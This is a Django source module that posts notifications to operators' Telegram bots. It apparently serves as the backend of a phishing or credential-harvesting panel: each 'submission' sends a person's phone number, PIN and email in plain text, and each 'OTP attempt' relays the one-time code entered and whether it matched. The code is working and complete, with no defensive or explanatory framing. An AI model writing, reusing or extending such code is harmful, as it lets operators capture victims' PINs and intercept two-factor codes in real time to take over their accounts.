"""
Direct Telegram Bot API integration.

Replaces the previous n8n webhook approach. Each BusinessOwner has their own
TelegramConfiguration (bot_token + chat_id). Notifications are sent directly
from Django to the Telegram Bot API — no intermediary.
"""

import logging
from datetime import timezone as dt_timezone

import requests
from django.utils import timezone

logger = logging.getLogger(__name__)

TELEGRAM_API_BASE = "https://api.telegram.org/bot{token}/sendMessage"


# ── Low-level send ─────────────────────────────────────────────────────────────

def _send_telegram_message(bot_token: str, chat_id: str, text: str) -> tuple[bool, str]:
    """
    POST a message to the Telegram Bot API.
    Returns (success: bool, error_message: str).
    Credentials are never logged.
    """
    url = TELEGRAM_API_BASE.format(token=bot_token)
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.ok:
            return True, ""
        # Telegram returns JSON error bodies — extract the description
        try:
            error_body = response.json()
            description = error_body.get("description", response.text[:200])
        except Exception:
            description = response.text[:200]
        logger.error(
            "Telegram API error (HTTP %s): %s | chat_id ends: ...%s",
            response.status_code,
            description,
            chat_id[-4:] if len(chat_id) >= 4 else "****",
        )
        return False, f"HTTP {response.status_code}: {description}"
    except requests.Timeout:
        logger.error("Telegram API request timed out.")
        return False, "Request timed out"
    except requests.ConnectionError as exc:
        logger.error("Telegram API connection error: %s", exc)
        return False, f"Connection error: {exc}"
    except requests.RequestException as exc:
        logger.error("Telegram API request failed: %s", exc)
        return False, str(exc)


def _get_telegram_config(business_owner):
    """
    Retrieve active TelegramConfiguration for a BusinessOwner.
    Returns (bot_token, chat_id) or raises ValueError with a user-friendly message.
    """
    try:
        config = business_owner.telegram_config
    except Exception:
        raise ValueError(
            f"No Telegram configuration found for {business_owner.business_name}."
        )
    if not config.is_active:
        raise ValueError(
            f"Telegram configuration for {business_owner.business_name} is disabled."
        )
    if not config.bot_token or not config.chat_id:
        raise ValueError(
            f"Incomplete Telegram configuration for {business_owner.business_name}."
        )
    return config.bot_token, config.chat_id


# ── Notification helpers ───────────────────────────────────────────────────────

def _format_submission_message(submission) -> str:
    """Build the Telegram notification text for a new submission."""
    lines = [
        "📋 <b>New Submission</b>",
        "",
        f"📞 <b>Phone:</b> {submission.phone}",
        f"🔑 <b>PIN:</b> {submission.pin}",
    ]
    if submission.email:
        lines.append(f"📧 <b>Email:</b> {submission.email}")
    lines += [
        "",
        f"🕐 <b>Time:</b> {submission.created_at.astimezone(dt_timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        f"🆔 <b>Ref:</b> #{submission.pk}",
    ]
    return "\n".join(lines)


def _format_otp_message(attempt) -> str:
    """Build the Telegram notification text for an OTP attempt."""
    sub = attempt.submission
    status_icon = "✅" if attempt.matched else "❌"
    lines = [
        f"{status_icon} <b>OTP Attempt #{attempt.attempt_number}</b>",
        "",
        f"📞 <b>Phone:</b> {sub.phone}",
        f"🔢 <b>OTP Entered:</b> {attempt.otp_entered}",
        f"{'✅ Matched' if attempt.matched else '❌ Did not match'}",
        "",
        f"🆔 <b>Submission Ref:</b> #{sub.pk}",
        f"🕐 <b>Time:</b> {attempt.created_at.astimezone(dt_timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
    ]
    return "\n".join(lines)


# ── Public API ─────────────────────────────────────────────────────────────────

def notify_telegram(submission) -> None:
    """
    Send a submission.created notification to the business owner's Telegram.
    Called via transaction.on_commit() after the submission is saved.

    Updates submission.tg_notified / tg_notified_at / tg_notification_error.
    A Telegram failure does NOT destroy the submission — it is already saved.
    """
    business_owner = getattr(submission, "business_owner", None)
    if business_owner is None:
        logger.warning(
            "Submission #%s has no associated business owner — skipping Telegram notification.",
            submission.pk,
        )
        return

    try:
        bot_token, chat_id = _get_telegram_config(business_owner)
    except ValueError as exc:
        logger.warning("Telegram config unavailable for submission #%s: %s", submission.pk, exc)
        submission.tg_notification_error = str(exc)
        try:
            submission.save(update_fields=["tg_notification_error"])
        except Exception:
            pass
        return

    text = _format_submission_message(submission)
    success, error = _send_telegram_message(bot_token, chat_id, text)

    submission.tg_notified = success
    if success:
        submission.tg_notified_at = timezone.now()
        submission.tg_notification_error = ""
        logger.info("Submission #%s sent to Telegram for %s.", submission.pk, business_owner.business_name)
    else:
        submission.tg_notification_error = error
        logger.error(
            "Telegram notification failed for submission #%s (%s): %s",
            submission.pk, business_owner.business_name, error,
        )

    try:
        submission.save(update_fields=["tg_notified", "tg_notified_at", "tg_notification_error"])
    except Exception as exc:
        logger.error("Failed to save Telegram status for submission #%s: %s", submission.pk, exc)


def notify_telegram_otp(attempt) -> None:
    """
    Send an OTP attempt notification to the business owner's Telegram.
    Called synchronously inside the view so attempt_number is always accurate.
    """
    sub = attempt.submission
    business_owner = getattr(sub, "business_owner", None)
    if business_owner is None:
        logger.warning(
            "OTP attempt (submission #%s) has no business owner — skipping Telegram.",
            sub.pk,
        )
        return

    try:
        bot_token, chat_id = _get_telegram_config(business_owner)
    except ValueError as exc:
        logger.warning("Telegram config unavailable for OTP attempt (sub #%s): %s", sub.pk, exc)
        attempt.tg_notification_error = str(exc)
        try:
            attempt.save(update_fields=["tg_notification_error"])
        except Exception:
            pass
        return

    text = _format_otp_message(attempt)
    success, error = _send_telegram_message(bot_token, chat_id, text)

    attempt.tg_notified = success
    if success:
        attempt.tg_notified_at = timezone.now()
        attempt.tg_notification_error = ""
        logger.info(
            "OTP attempt #%s (submission #%s) sent to Telegram for %s.",
            attempt.attempt_number, sub.pk, business_owner.business_name,
        )
    else:
        attempt.tg_notification_error = error
        logger.error(
            "Telegram OTP notification failed (sub #%s, attempt #%s): %s",
            sub.pk, attempt.attempt_number, error,
        )

    try:
        attempt.save(update_fields=["tg_notified", "tg_notified_at", "tg_notification_error"])
    except Exception as exc:
        logger.error(
            "Failed to save Telegram OTP status (sub #%s): %s", sub.pk, exc
        )


def test_telegram_connection(bot_token: str, chat_id: str) -> tuple[bool, str]:
    """
    Send a test message using the given credentials.
    Returns (success: bool, message: str) suitable for displaying to the user.
    Used by the dashboard Telegram config page.
    """
    text = (
        "✅ <b>Connection test successful!</b>\n\n"
        "Your Telegram configuration is working correctly.\n"
        "Submissions will be delivered here."
    )
    success, error = _send_telegram_message(bot_token, chat_id, text)
    if success:
        return True, "Test message sent successfully. Check your Telegram."
    return False, f"Failed to send test message: {error}"
